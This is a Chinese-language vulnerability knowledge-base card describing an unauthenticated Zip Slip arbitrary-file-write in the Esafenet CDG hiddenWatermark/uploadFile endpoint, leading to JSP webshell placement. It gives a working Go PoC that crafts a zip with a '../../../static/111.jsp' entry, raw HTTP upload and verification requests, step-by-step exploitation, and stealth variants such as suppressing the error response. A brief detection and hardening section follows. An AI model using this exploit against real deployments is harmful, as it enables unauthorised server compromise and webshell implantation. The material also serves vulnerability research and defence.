---
id: web-generic-file-upload-esafenet-hiddenwatermark-zipslip-webshell
title: 亿赛通 CDG hiddenWatermark uploadFile：鉴权排除 + 解压 Zip Slip 任意写 Web 目录 JSP
type: scenario
domain: web
path: web/generic/file-upload
technique: esafenet-hiddenwatermark-zipslip-arbitrary-write
aliases:
- 亿赛通 hiddenWatermark 文件上传
- CDG hiddenWatermark uploadFile
- CDGUtil.unzipFile Zip Slip
- 亿赛通 CDG 任意文件写入
- excludedClientUrls 鉴权排除
tags:
- java
- esafenet
- cdg
- file-upload
- zip-slip
- path-traversal
- arbitrary-file-write
- webshell
- auth-bypass
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V574
  verified_at: '2026-11-12T11:06:46+08:00'
  notes: 已对照12908原文203行与全部6图核对（图片6/6读取成功，均降为最长边1200 JPEG读取，无失败）：图01 SessionValidateFilter.init 将 excludedClientUrls 读入 this.excludedClientUrls、图02 doFilter 中 startsWith(excludedClientUrls) 直接 filterChain.doFilter 放行（web.xml 含 /hiddenWatermark/）、图03 HiddenWatermarkController.uploadFile 取 doc、uuid+ext 重命名、FileUtil.writeFile 写zip、CDGUtil.unzipFile 解压并读 theme1.xml、图04 unzipWithStream 中 outPath=descDir+zipEntryName 未规范化、图05 POST /CDGServer3/hiddenWatermark/uploadFile 返回200 {"fileId":"null"}、图06 GET /CDGServer3/static/111.jsp 返回test1，卡片技术点、利用步骤、Go PoC与原文一致；entry ../../../static/111.jsp 经 substring 吞掉首个“..”后恰好落到 CDGServer3/static，与截图结果一致。原文未标注产品版本，affected_versions空缺正确。dedup：首位为自身；与同产品 web-generic-file-upload-cdg-uploadsoftware-patch-traversal-webshell(/file/uploadSoftWareFile 的 patch 参数穿越)端点与sink不同，与LinkFilterService鉴权绕过/importPolicy反序列化亦不同，非同链；库内无 hiddenWatermark 卡，保留合理。内部链接均存在；frontmatter无sources与库内规范一致。PoC未复跑。
---

## 一句话结论

亿赛通 CDG 的 `SessionValidateFilter` 把 `/hiddenWatermark/` 列入 `excludedClientUrls` 直接放行，`HiddenWatermarkController.uploadFile` 又把上传的 zip 交给 `CDGUtil.unzipFile`/`unzipWithStream` 解压，而解压路径用 `descDir + zipEntryName` 直接拼接、未做规范化校验，攻击者可构造含 `../../../static/111.jsp` 的 zip，把 JSP 写到 Web 可访问目录并执行。

## 原理

- **鉴权绕过**：`SessionValidateFilter.doFilter` 遍历 `excludedClientUrls`，只要 `servletPath.startsWith(url)` 就 `filterChain.doFilter` 直接放行；`web.xml` 的 `excludedClientUrls` 包含 `/hiddenWatermark/`，因此该控制器无需登录即可访问。
- **上传落盘**：`HiddenWatermarkController.uploadFile` 从 multipart 取 `doc` 文件，用 `uuid + ext` 重命名后 `item.write(savedFile)` 写入 `realPath/upload/`，再 `FileUtil.writeFile` 写成 `<uuid>.zip`，随后调用 `CDGUtil.unzipFile(dirPath + uuid.zip, dirPath + uuid)` 解压到以 uuid 命名的目录。
- **Zip Slip**：`unzipWithStream` 遍历 `ZipEntry` 时只按 `/` 截取目录部分，最终 `outPath = descDir + zipEntryName`，没有 `getCanonicalPath()` 前缀校验，也没有过滤 `../`；因此 entry 名中的 `../` 会让写入路径逃出解压目录。代码还先 `outPath.substring(0, outPath.lastIndexOf('/'))` 建父目录，进一步保证穿越后的目录会被创建。
- **落地与执行**：把 entry 名设为 `../../../static/111.jsp`，以默认部署的 `CDGServer3/upload/<uuid>` 为基准即可穿越回 `CDGServer3/static/`；`static` 不经过 Session 过滤（也在 `/static/` 排除项内）且由 Tomcat 作为静态资源解析，访问 `/CDGServer3/static/111.jsp` 即执行 JSP。也可按实际路径写到 `../../../../../tomcat/webapps/ROOT/`。
- **异常不影响写入**：解压后代码会读取 `<uuid>/theme/theme1.xml` 并解析；如果没有这个文件会抛异常进入 catch 返回 `{"fileId":"null"}`，但此时 zip 已被解压、JSP 已落盘，响应失败不代表写入失败。
- 根因是「文件名/Entry 名不可信 + 解压目标路径拼接未规范化」的经典 Zip Slip，与上传后缀黑名单无关——zip 内部 entry 名即攻击者可控的落盘路径。

## 触发条件

- 目标为存在 `/CDGServer3/hiddenWatermark/uploadFile` 的亿赛通 CDG 部署。
- `excludedClientUrls` 保留 `/hiddenWatermark/`（默认配置即如此），接口无需会话即可访问。
- 进程对 Web 目录（如 `CDGServer3/static/` 或 `webapps/ROOT/`）有写权限。
- 目标容器会解析 JSP（Tomcat），且写入目录可被静态访问。

## 利用步骤

1. 制作恶意 zip：entry 名使用相对路径穿越，如 `../../../static/111.jsp`，内容为 JSP WebShell 或验证用字符串。
2. 向 `/CDGServer3/hiddenWatermark/uploadFile` 发送 multipart 请求，文件字段名为 `doc`，文件名任意（服务端会重命名为 uuid）。
3. 服务端把上传内容写成 zip 并解压；即使响应为 `{"fileId":"null"}`（缺少 theme1.xml 的异常路径），文件也已写入。
4. 访问 `GET /CDGServer3/static/111.jsp` 验证写入；返回内容即上传的测试字符串，换成 JSP 后即为 WebShell。
5. 若目标路径不确定，可先写无害文本确认 `static` 目录可达，再按部署结构调整穿越层级（如 `../../../../../tomcat/webapps/ROOT/`）。

## PoC

恶意 zip 生成（Go，最小化）：

```go
package main

import (
    "archive/zip"
    "os"
)

func main() {
    f, _ := os.OpenFile("test1.zip", os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0644)
    defer f.Close()
    zw := zip.NewWriter(f)
    defer zw.Close()
    w, _ := zw.CreateHeader(&zip.FileHeader{Name: "../../../static/111.jsp", Method: zip.Deflate})
    w.Write([]byte("test1"))
}
```

上传请求骨架：

```http
POST /CDGServer3/hiddenWatermark/uploadFile HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----ZJFgyTJOTvpUxHrORpYjkblliLjmziUgFqpcBCZJ

------ZJFgyTJOTvpUxHrORpYjkblliLjmziUgFqpcBCZJ
Content-Disposition: form-data; name="doc"; filename="1.zip"

<test1.zip 的二进制内容>
------ZJFgyTJOTvpUxHrORpYjkblliLjmziUgFqpcBCZJ--
```

验证：

```http
GET /CDGServer3/static/111.jsp HTTP/1.1
Host: target
```

原文响应 200、正文 `test1`，证明穿越写入 Web 目录成功；本库未复跑。

## 变体与关联

- 变体：按 Tomcat 部署写 `../../../../../tomcat/webapps/ROOT/`，直接落在 ROOT 应用根。
- 变体：entry 名使用 `..\\`（Windows 分隔符）配合代码里的 `replace("\\", "/")` 也能穿越。
- 变体：zip 内同时放入 `theme/theme1.xml` 可让流程走完正常返回 `fileId`，避免异常响应引起注意。
- 关联：[[web-generic-file-upload-cdg-uploadsoftware-patch-traversal-webshell]]（同产品另一入口 `/file/uploadSoftWareFile` 的 patch 参数穿越，sink 不同）、[[web-java-component-esafenet-cdg-linkfilterservice-auth-bypass]]（同产品鉴权绕过）、[[web-java-component-esafenet-cdg-importpolicy-deserialization-rce]]（同产品反序列化）。
- 边界：Web 目录不可写、容器不解析 JSP、或部署做了 canonical 路径校验时失效。

## 检测与防御

- 检测：`POST /CDGServer3/hiddenWatermark/uploadFile` 上传 zip；`ZipEntry` 名含 `../`/`..\`/绝对路径；`upload/` 目录下出现解压出的 JSP；Web 目录新增脚本文件。
- 防御：解压前对每个 entry 取 `getCanonicalPath()` 并校验 `startsWith(descDir)`；过滤 entry 名中的 `..`、绝对路径与盘符；上传目录与 Web 根分离并禁止脚本解析。
- 加固：从 `excludedClientUrls` 移除 `/hiddenWatermark/` 等业务接口，鉴权改为白名单最小化；对上传接口加认证、大小与类型限制；Tomcat 上传目录关闭 JSP 解析。
